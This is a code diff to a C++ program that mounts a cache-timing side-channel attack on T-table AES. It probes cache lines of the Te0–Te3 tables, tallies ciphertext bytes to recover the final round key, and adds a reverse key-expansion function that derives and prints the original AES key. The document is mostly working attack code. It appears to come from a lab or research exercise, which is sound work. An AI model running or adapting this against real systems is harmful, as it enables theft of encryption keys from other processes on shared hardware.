@@ -28,6 +28,88 @@ extern "C" {
 /*** SET THESE ADDRESSES FOR SYSTEM BEFORE RUNNING ***/
 #define CACHE_MISS (250)
 
+//0-15, since 16 cache lines per table
+#define CACHE_LINE_TO_MONITOR_PER_TABLE (1)
+
+static const uint8_t sbox[256u] =
+{
+    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
+    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
+    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
+    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
+    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
+    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
+    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
+    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
+    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
+    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
+    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
+    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
+    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
+    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
+    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
+    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16
+};
+
+//Backwards from https://github.com/openssl/openssl/blob/master/crypto/aes/aes_core.c
+static const uint32_t rcon[] = {
+    0x36000000, 0x1b000000, 0x80000000, 0x40000000,
+    0x20000000, 0x10000000, 0x08000000, 0x04000000,
+    0x02000000, 0x01000000  
+    /* for 128-bit blocks, Rijndael never uses more than 10 rcon values */
+};
+
+//inspired from https://github.com/fanosta/aeskeyschedule, rewritten from Python to C
+// as well as https://github.com/cmcqueen/aes-min/blob/master/aes-min.c for rot_word and sub_word
+uint32_t sub_word(uint32_t in) {
+
+  uint8_t t1 = sbox[(in >> 24) & 0x000000ff];
+  uint8_t t2 = sbox[(in >> 16) & 0x000000ff];
+  uint8_t t3 = sbox[(in >> 8 ) & 0x000000ff];
+  uint8_t t4 = sbox[in & 0x000000ff];
+
+  return (t1 << 24) ^ (t2 << 16) ^ (t3 << 8) ^ t4;
+}
+
+//rotate left by 8 bits
+uint32_t rot_word(uint32_t a)
+{ 
+  //move left by 8 and move everything that fell off back to right side
+  return ((a << 8) | (a >> (32 - 8)));
+}
+
+unsigned int reverse_key_expansion(unsigned int round_key[TXT_BYTES], const uint32_t *rcon) {
+    //bytes rk[0:3]
+    uint32_t a2 = (round_key[0] << 24) | (round_key[1] << 16) | (round_key[2] << 8) | (round_key[3]);
+
+    //rk[4:7]
+    uint32_t b2 = (round_key[4] << 24) | (round_key[5] << 16) | (round_key[6] << 8) | (round_key[7]);
+
+    //rk[8:11]
+    uint32_t c2 = (round_key[8] << 24) | (round_key[9] << 16) | (round_key[10] << 8) | (round_key[11]);
+
+    //rk[12:15]
+    uint32_t d2 = (round_key[12] << 24) | (round_key[13] << 16) | (round_key[14] << 8) | (round_key[15]);
+
+    uint32_t a1, b1, c1, d1;
+
+    for (int i = 0; i < 10; ++i) {
+      d1 = d2 ^ c2;
+      c1 = c2 ^ b2;
+      b1 = b2 ^ a2;
+      a1 = a2 ^ sub_word(rot_word(d1)) ^ rcon[i];
+
+      a2 = a1;
+      b2 = b1;
+      c2 = c1;
+      d2 = d1;
+    }
+
+    unsigned int aes_key = a1 + b1 + c1 + d1;
+    printf("Your AES key is: %x%x%x%x\n", a1, b1, c1, d1);
+    return aes_key;
+}
+
 static const uint8_t Te4[256] = {
     0x63U, 0x7cU, 0x77U, 0x7bU, 0xf2U, 0x6bU, 0x6fU, 0xc5U,
     0x30U, 0x01U, 0x67U, 0x2bU, 0xfeU, 0xd7U, 0xabU, 0x76U,
@@ -139,7 +221,7 @@ int main(int argc, char **argv) {
       //proceed to test access times for Te0, ..., Te3
 
       //Te0
-        ADDR_PTR test_addr = te0 + 64;
+        ADDR_PTR test_addr = te0 + (64*CACHE_LINE_TO_MONITOR_PER_TABLE);
 
         if (test_addr > end) {
           printf("accessing past boundaries of AES program... not good\n");
@@ -171,7 +253,7 @@ int main(int argc, char **argv) {
       
 
       //Te1
-        test_addr = te1 + 64;
+        test_addr = te1 + (64*CACHE_LINE_TO_MONITOR_PER_TABLE);
 
         if (test_addr > end) {
           printf("accessing past boundaries of AES program... not good\n");
@@ -202,7 +284,7 @@ int main(int argc, char **argv) {
 
 
       //Te2
-        test_addr = te2 + 64;
+        test_addr = te2 + (64*CACHE_LINE_TO_MONITOR_PER_TABLE);
 
         if (test_addr > end) {
           printf("accessing past boundaries of AES program... not good\n");
@@ -232,7 +314,7 @@ int main(int argc, char **argv) {
         encryptions_per_byte[12*256 + ciphertxt[12]] += 1;
 
       //Te3
-        test_addr = te3 + 64;
+        test_addr = te3 + (64*CACHE_LINE_TO_MONITOR_PER_TABLE);
 
         if (test_addr > end) {
           printf("accessing past boundaries of AES program... not good\n");
@@ -297,7 +379,7 @@ int main(int argc, char **argv) {
   
   for (int pos = 0; pos < TXT_BYTES; ++pos) {
     for (int cand = 0; cand < TXT_BYTES; ++cand) {
-      for (int te4_idx = 16; te4_idx < 32; ++te4_idx) {
+      for (int te4_idx = 16*CACHE_LINE_TO_MONITOR_PER_TABLE; te4_idx < (16*(CACHE_LINE_TO_MONITOR_PER_TABLE + 1)); ++te4_idx) {
         round_keys[pos][ciphertxt_candidates[pos][cand] ^ Te4[te4_idx]]++;
       }
     }
@@ -325,20 +407,22 @@ int main(int argc, char **argv) {
   unsigned int round_key[TXT_BYTES];
 
   for (int pos = 0; pos < TXT_BYTES; ++pos) {
-    printf("--- Top Candidates for position %d---\n\n", pos);
-    for (const auto &pair : roundkey_histograms[pos]) {
-        std::cout << pair.first << ": " << pair.second << std::endl;
-    }
-    printf("\n\n");
+    // printf("--- Top Candidates for position %d---\n\n", pos);
+    // for (const auto &pair : roundkey_histograms[pos]) {
+    //     std::cout << pair.first << ": " << pair.second << std::endl;
+    // }
+    // printf("\n\n");
 
     round_key[pos] = roundkey_histograms[pos][0].first;
   }
 
-  printf("Your round key is: ");
-  for (int pos = 0; pos < TXT_BYTES; ++pos) {
-    printf("%u ", round_key[pos]);
-  }
-  printf("\n");
+  // printf("Your round key is: ");
+  // for (int pos = 0; pos < TXT_BYTES; ++pos) {
+  //   printf("%u ", round_key[pos]);
+  // }
+  // printf("\n");
+
+  reverse_key_expansion(round_key, rcon);
 
   close(aes);
   munmap((void *)start, map_size);
